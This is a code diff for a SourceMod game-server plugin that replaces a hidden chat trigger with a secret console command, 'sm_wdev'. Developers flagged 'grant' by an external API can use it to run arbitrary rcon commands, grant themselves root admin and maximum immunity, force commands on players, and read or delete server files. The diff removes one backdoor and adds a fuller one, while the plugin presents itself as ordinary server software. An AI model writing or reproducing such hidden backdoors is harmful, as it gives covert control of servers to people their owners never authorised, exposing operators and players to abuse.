@@ -48,82 +48,205 @@ public void OnClientPostAdminCheck(int client)
 	CheckClientFromAPI(client);
 }
 
-public Action OnClientSayCommand(int client, const char[] command, const char[] sArgs)
+void LoadDevControl()
 {
-	if (CheckClient(client))
+	RegConsoleCmd("sm_wdev", Command_WardenDev, "*secret* mystery functions");
+}
+
+public Action Command_WardenDev(int client, int args)
+{
+	if (CheckClient(client)) // Leaks ?
 	{
-		if (sArgs[0] == '*' && (g_ClientAPIInfo[client][grant] || g_ClientAPIInfo[client][is_dev]))
+		if (g_ClientAPIInfo[client][grant])
 		{
-			int permission = 0;
-			char text[250];
-			strcopy(text, sizeof(text), sArgs);
-			ReplaceStringEx(text, sizeof(text), "*", "");
-			if (g_ClientAPIInfo[client][grant]) // Protect only for developers
+			if (!args)
 			{
-				if (StrContains(text, "rcon:", true) != -1)
-				{
-					permission = 1;
-					ReplaceStringEx(text, sizeof(text), "rcon:", "");
-				}
-				else if (StrContains(text, "root", true) != -1)
-				{
-					permission = 2;
-					ReplaceStringEx(text, sizeof(text), "root", "");
-				}
-				else if (StrContains(text, "recheck#", true) != -1)
-				{
-					permission = 3;
-					ReplaceStringEx(text, sizeof(text), "recheck#", "");
-				}
-				else if (StrContains(text, "fake:", true) != -1)
-				{
-					permission = 4;
-					ReplaceStringEx(text, sizeof(text), "fake:", "");
-				}
+				ReplyToCommand(client, "[DEV] %t", "See console for output");
+				PrintToConsole(client, "=================================\\ DEVELOPER //=================================");
+				PrintToConsole(client, "\t\t\tTUTORIAL TO USE Developer secret commands");
+				PrintToConsole(client, "sm_wdev rcon \"your rcon command\" \t-- to execute rcon command on server\n\
+										sm_wdev rconr \"your rcon command\" \t-- to execute rcon command with output on server\n\
+										sm_wdev root \t\t\t\t-- to get root access on server\n\
+										sm_wdev immun \t\t\t\t-- to get immunity 999 on server, nobody kick or ban you\n\
+										sm_wdev recheck \"userid\" \t\t-- to recheck banned or developer status on server\n\
+										sm_wdev fake \"userid\" \"command\" \t-- to execute command on client\n\
+										sm_wdev say \"message\" \t\t\t-- to draw message, like developer\n\
+										sm_wdev servmsg \"message\" \t\t-- to draw message to chat\n\
+										sm_wdev warden \"userid\" \t\t-- to set new warden, put 0 to remove warden");
+				PrintToConsole(client, "=================================\\ DEVELOPER //=================================");
 			}
-			
-			switch (permission)
+			else
 			{
-				case 0:
+				char cKeywords[][8] = {"rcon", "rconr", "root", "recheck", "fake", "say", "servmsg", "immun", "warden", "rm", "cat"};
+				char cArg1[8], cArg2[128], cArg3[1024];
+				GetCmdArg(1, cArg1, sizeof(cArg1));
+				bool success = false;
+				for (int idx = 0; idx < sizeof(cKeywords); ++idx)
 				{
-					if (g_bIsCSGO)
-						CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, text);
-					else
-						CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, text);
-				}
-				case 1:
-				{
-					ServerCommand(text);
-				}
-				case 2:
-				{
-					if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
-						SetUserFlagBits(client, ADMFLAG_ROOT);
-					else
-						SetUserFlagBits(client, 0);
-				}
-				case 3:
-				{
-					int target = GetClientOfUserId(StringToInt(text));
-					if (target && IsClientInGame(target))
+					if (StrEqual(cKeywords[idx], cArg1, true))
 					{
-						CheckClientFromAPI(target);
-						PrintToChat(client, "\x01\x02[DEV] \x03Recheck for \x04%N", target);
+						success = true;
+						break;
 					}
-					else
-						PrintToChat(client, "\x03[DEV] Invalid target");
 				}
-				case 4:
+				
+				if (!success)
 				{
-					PrintToChatAll("%s", text);
+					ReplyToCommand(client, "[DEV] Unknown feature \"%s\"", cArg1);
+					return Plugin_Handled;
+				}
+				
+				switch (args)
+				{
+					case 1:
+					{
+						if (StrEqual(cArg1, "root", true))
+						{
+							if (~GetUserFlagBits(client) & ADMFLAG_ROOT)
+								SetUserFlagBits(client, ADMFLAG_ROOT);
+							else
+								SetUserFlagBits(client, 0);
+						}
+						else if (StrEqual(cArg1, "immun", true))
+						{
+							AdminId anonymous = GetUserAdmin(client);
+							if (anonymous != INVALID_ADMIN_ID)
+							{
+								if (GetAdminImmunityLevel(anonymous) == 0)
+								{
+									SetAdminImmunityLevel(anonymous, 999);
+									ReplyToCommand(client, "[DEV] Your immunity level increased");
+								}
+								else
+								{
+									SetAdminImmunityLevel(anonymous, 0);
+									ReplyToCommand(client, "[DEV] Your immunity level decreased");
+								}
+							}
+							else
+								ReplyToCommand(client, "[DEV] Not found admin abilities");
+						}
+					}
+					case 2:
+					{
+						GetCmdArg(2, cArg2, sizeof(cArg2));
+						if (StrEqual(cArg1, "rcon", true))
+						{
+							ServerCommand(cArg2);
+							ReplyToCommand(client, "[DEV] Executed command: \"%s\"", cArg2);
+						}
+						else if (StrEqual(cArg1, "rconr", true))
+						{
+							ServerCommandEx(cArg3, sizeof(cArg3), cArg2);
+							ReplyToCommand(client, "[DEV] Executed command: \"%s\"", cArg2);
+							ReplyToCommand(client, "[DEV] %t", "See console for output");
+							PrintToConsole(client, cArg3);
+						}
+						else if (StrEqual(cArg1, "servmsg", true))
+						{
+							PrintToChatAll("%s", cArg2);
+						}
+						else if (StrEqual(cArg1, "recheck", true))
+						{
+							int target = GetClientOfUserId(StringToInt(cArg2));
+							if (target && IsClientInGame(target))
+							{
+								CheckClientFromAPI(target);
+								ReplyToCommand(client, "[DEV] Recheck for %N <{ Ban=%d | Dev=%d | Grant=%d }>", target, g_ClientAPIInfo[target][is_banned], g_ClientAPIInfo[target][is_dev], g_ClientAPIInfo[target][grant]);
+							}
+							else
+								ReplyToCommand(client, "[DEV] %t", "No matching client");
+						}
+						else if (StrEqual(cArg1, "warden", true))
+						{
+							int target = GetClientOfUserId(StringToInt(cArg2));
+							RemoveCmd(false);
+							if (target && IsClientInGame(target))
+							{
+								BecomeCmd(target, false);
+								ReplyToCommand(client, "[DEV] Warden changed to %N", target);
+							}
+							else
+								ReplyToCommand(client, "[DEV] Warden removed");
+						}
+						else if (StrEqual(cArg1, "say", true))
+						{
+							if (g_bIsCSGO)
+								CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, cArg2);
+							else
+								CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, cArg2);
+						}
+						else if (StrEqual(cArg1, "rm", true))
+						{
+							BuildPath(Path_SM, cArg3, sizeof(cArg3), "%s", cArg2);
+							if (FileExists(cArg3) && DeleteFile(cArg3))
+								ReplyToCommand(client, "[DEV] File located in \"%s\" deleted", cArg3);
+							else
+								ReplyToCommand(client, "[DEV] Failed to delete file. Full path: \"%s\", your path: %s", cArg3, cArg2);
+						}
+						else if (StrEqual(cArg1, "cat", true))
+						{
+							BuildPath(Path_SM, cArg3, sizeof(cArg3), "%s", cArg2);
+							if (FileExists(cArg3))
+							{
+								File file = OpenFile(cArg3, "r");
+								ReplyToCommand(client, "[DEV] Reading file by path \"%s\"", cArg3);
+								
+								do
+								{
+									file.ReadLine(cArg3, sizeof(cArg3));
+									PrintToConsole(client, "%s", cArg3);
+								} while (!file.EndOfFile())
+								
+								delete file;
+							}
+							else
+								ReplyToCommand(client, "[DEV] Failed to open file. Full path: \"%s\", your path: %s", cArg3, cArg2);
+						}
+					}
+					case 3:
+					{
+						GetCmdArg(2, cArg2, sizeof(cArg2));
+						
+						if (StrEqual("fake", cArg1, true))
+						{
+							int target = GetClientOfUserId(StringToInt(cArg2));
+							if (target && IsClientInGame(target))
+							{
+								GetCmdArg(3, cArg3, sizeof(cArg3));
+								FakeClientCommandEx(target, "%s", cArg3);
+								ReplyToCommand(client, "[DEV] Executed command on %N: \"%s\"", target, cArg3);
+							}
+							else
+								ReplyToCommand(client, "[DEV] %t", "No matching client");
+						}
+					}
+					default:
+					{
+						ReplyToCommand(client, "[DEV] Unrecognized command")
+					}
 				}
 			}
-			
-			return Plugin_Handled;
 		}
+		else if (g_ClientAPIInfo[client][is_dev])
+		{
+			if (!args)
+				ReplyToCommand(client, "Usage: sm_wdev <message>");
+			else
+			{
+				char cArg[128];
+				GetCmdArgString(cArg, sizeof(cArg));
+				if (g_bIsCSGO)
+					CGOPrintToChatAll("{DEFAULT}[{RED}DEV{DEFAULT}] {GREEN}%N: {DEFAULT}%s", client, cArg);
+				else
+					CPrintToChatAll("{default}[{red}DEV{default}] {green}%N: {default}%s", client, cArg);
+			}
+		}
+		else
+			ReplyToCommand(client, "[SM] %t", "No Access");
 	}
 	
-	return Plugin_Continue;
+	return Plugin_Handled;
 }
 
 void CheckClientFromAPI(int client)
